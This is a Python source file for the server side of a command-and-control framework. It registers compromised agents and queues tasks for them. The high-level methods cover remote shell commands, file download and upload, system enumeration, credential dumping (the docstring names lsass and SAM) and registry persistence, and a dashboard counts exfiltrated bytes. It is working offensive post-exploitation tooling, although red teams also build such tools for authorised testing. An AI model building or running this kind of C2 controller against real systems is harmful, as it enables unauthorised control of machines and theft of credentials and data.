"""
C2 Controller
Server-side C2 controller for managing deployed agents
"""

import asyncio
import secrets
import base64
from typing import Dict, List, Any, Optional
from datetime import datetime, timezone
import structlog

from .session import C2Session, SessionManager

logger = structlog.get_logger()


class C2Controller:
    """
    Command & Control Controller
    Manages C2 sessions and agent tasking
    """

    def __init__(self):
        self.session_manager = SessionManager()
        self.task_queue: Dict[str, List[Dict[str, Any]]] = {}  # agent_id -> tasks
        self.task_results: Dict[str, List[Dict[str, Any]]] = {}  # agent_id -> results

    def register_agent(
        self,
        agent_id: str,
        hostname: str,
        ip: str,
        os_info: str,
        username: str
    ) -> C2Session:
        """
        Register a new C2 agent and create session

        Args:
            agent_id: Unique agent identifier
            hostname: Agent hostname
            ip: Agent IP address
            os_info: Operating system information
            username: Current user on agent

        Returns:
            C2Session object
        """
        # Generate encryption key for this session
        encryption_key = secrets.token_urlsafe(32)

        # Create session
        session = C2Session(
            agent_id=agent_id,
            agent_hostname=hostname,
            agent_ip=ip,
            agent_os=os_info,
            agent_user=username,
            encryption_key=encryption_key
        )

        # Add to session manager
        self.session_manager.add_session(session)

        # Initialize task queues
        self.task_queue[agent_id] = []
        self.task_results[agent_id] = []

        logger.info(
            "Agent registered",
            agent_id=agent_id,
            hostname=hostname,
            session_id=session.session_id
        )

        return session

    def send_task(
        self,
        agent_id: str,
        task_type: str,
        task_params: Dict[str, Any]
    ) -> Dict[str, Any]:
        """
        Send task to agent

        Args:
            agent_id: Target agent ID
            task_type: Type of task (shell, download, upload, etc.)
            task_params: Task parameters

        Returns:
            Task object with task_id
        """
        session = self.session_manager.get_session_by_agent_id(agent_id)

        if not session:
            raise ValueError(f"No active session for agent {agent_id}")

        if not session.is_alive():
            raise ValueError(f"Agent {agent_id} session is dead")

        # Create task
        task = {
            "task_id": secrets.token_urlsafe(16),
            "task_type": task_type,
            "params": task_params,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "status": "pending"
        }

        # Add to queue
        if agent_id not in self.task_queue:
            self.task_queue[agent_id] = []

        self.task_queue[agent_id].append(task)
        session.tasks_sent += 1

        logger.info(
            "Task sent to agent",
            agent_id=agent_id,
            task_id=task["task_id"],
            task_type=task_type
        )

        return task

    def get_pending_tasks(self, agent_id: str) -> List[Dict[str, Any]]:
        """
        Get pending tasks for an agent

        Args:
            agent_id: Agent ID

        Returns:
            List of pending tasks
        """
        session = self.session_manager.get_session_by_agent_id(agent_id)

        if session:
            session.update_last_seen()

        return self.task_queue.get(agent_id, [])

    def submit_task_result(
        self,
        agent_id: str,
        task_id: str,
        result: Dict[str, Any]
    ):
        """
        Submit task result from agent

        Args:
            agent_id: Agent ID
            task_id: Task ID
            result: Task result data
        """
        session = self.session_manager.get_session_by_agent_id(agent_id)

        if session:
            session.update_last_seen()
            session.tasks_completed += 1

        # Store result
        if agent_id not in self.task_results:
            self.task_results[agent_id] = []

        result_obj = {
            "task_id": task_id,
            "result": result,
            "submitted_at": datetime.now(timezone.utc).isoformat()
        }

        self.task_results[agent_id].append(result_obj)

        # Remove from pending queue
        if agent_id in self.task_queue:
            self.task_queue[agent_id] = [
                t for t in self.task_queue[agent_id]
                if t["task_id"] != task_id
            ]

        logger.info(
            "Task result received",
            agent_id=agent_id,
            task_id=task_id
        )

    def get_task_results(
        self,
        agent_id: str,
        task_id: Optional[str] = None
    ) -> List[Dict[str, Any]]:
        """
        Get task results for an agent

        Args:
            agent_id: Agent ID
            task_id: Optional specific task ID

        Returns:
            List of task results
        """
        results = self.task_results.get(agent_id, [])

        if task_id:
            results = [r for r in results if r["task_id"] == task_id]

        return results

    def get_session(self, session_id: str) -> Optional[C2Session]:
        """Get session by ID"""
        return self.session_manager.get_session(session_id)

    def get_all_sessions(self) -> List[C2Session]:
        """Get all sessions"""
        return self.session_manager.get_all_sessions()

    def get_active_sessions(self) -> List[C2Session]:
        """Get active sessions"""
        return self.session_manager.get_active_sessions()

    def terminate_session(self, session_id: str):
        """Terminate a session"""
        session = self.session_manager.get_session(session_id)

        if session:
            # Send termination task
            try:
                self.send_task(
                    session.agent_id,
                    "terminate",
                    {"reason": "operator_initiated"}
                )
            except:
                pass

            # Remove session
            self.session_manager.remove_session(session_id)

            logger.info("Session terminated", session_id=session_id)

    def cleanup_dead_sessions(self):
        """Cleanup dead sessions"""
        self.session_manager.cleanup_dead_sessions()

    def get_dashboard_stats(self) -> Dict[str, Any]:
        """Get C2 dashboard statistics"""
        all_sessions = self.get_all_sessions()
        active_sessions = self.get_active_sessions()

        total_tasks_sent = sum(s.tasks_sent for s in all_sessions)
        total_tasks_completed = sum(s.tasks_completed for s in all_sessions)
        total_data_exfil = sum(s.data_exfiltrated for s in all_sessions)

        return {
            "total_sessions": len(all_sessions),
            "active_sessions": len(active_sessions),
            "dead_sessions": len(all_sessions) - len(active_sessions),
            "total_tasks_sent": total_tasks_sent,
            "total_tasks_completed": total_tasks_completed,
            "total_data_exfiltrated_bytes": total_data_exfil,
            "sessions": [s.to_dict() for s in all_sessions]
        }

    # High-level tasking methods

    async def execute_shell_command(
        self,
        agent_id: str,
        command: str
    ) -> str:
        """
        Execute shell command on agent

        Args:
            agent_id: Target agent
            command: Shell command to execute

        Returns:
            Task ID
        """
        task = self.send_task(
            agent_id,
            "shell",
            {"command": command}
        )

        return task["task_id"]

    async def download_file(
        self,
        agent_id: str,
        remote_path: str,
        local_path: str
    ) -> str:
        """
        Download file from agent

        Args:
            agent_id: Target agent
            remote_path: Path on agent
            local_path: Local save path

        Returns:
            Task ID
        """
        task = self.send_task(
            agent_id,
            "download",
            {
                "remote_path": remote_path,
                "local_path": local_path
            }
        )

        return task["task_id"]

    async def upload_file(
        self,
        agent_id: str,
        local_path: str,
        remote_path: str
    ) -> str:
        """
        Upload file to agent

        Args:
            agent_id: Target agent
            local_path: Local file path
            remote_path: Path on agent

        Returns:
            Task ID
        """
        task = self.send_task(
            agent_id,
            "upload",
            {
                "local_path": local_path,
                "remote_path": remote_path
            }
        )

        return task["task_id"]

    async def enumerate_system(
        self,
        agent_id: str
    ) -> str:
        """
        Enumerate system information

        Args:
            agent_id: Target agent

        Returns:
            Task ID
        """
        task = self.send_task(
            agent_id,
            "enumerate",
            {"type": "system"}
        )

        return task["task_id"]

    async def dump_credentials(
        self,
        agent_id: str,
        method: str = "auto"
    ) -> str:
        """
        Dump credentials from agent

        Args:
            agent_id: Target agent
            method: Credential dumping method (auto, lsass, sam, etc.)

        Returns:
            Task ID
        """
        task = self.send_task(
            agent_id,
            "dump_creds",
            {"method": method}
        )

        return task["task_id"]

    async def establish_persistence(
        self,
        agent_id: str,
        method: str = "registry"
    ) -> str:
        """
        Establish persistence on agent

        Args:
            agent_id: Target agent
            method: Persistence method

        Returns:
            Task ID
        """
        task = self.send_task(
            agent_id,
            "persistence",
            {"method": method}
        )

        return task["task_id"]
